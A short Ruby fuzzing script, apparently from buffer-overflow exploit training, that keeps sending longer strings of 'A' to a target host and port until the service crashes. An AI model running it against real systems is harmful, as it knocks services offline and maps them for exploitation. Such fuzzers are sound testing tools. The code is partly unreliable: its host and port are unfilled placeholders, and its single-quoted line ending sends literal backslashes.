require 'socket'

buff = "A" * 100
RHOST = #IP address of the target machine, example: "10.10.10.0"
RPORT = #Port number of the target machine, example: 21

begin
    while true
        s = TCPSocket.open(RHOST, RPORT)
        s.puts buff + '\r\n'
        s.close
        sleep 1
        buffSize = buff.size
        buff += "A" * 100
    end
rescue Interrupt
    puts "Debugger crashed at #{buffSize} bytes"
end
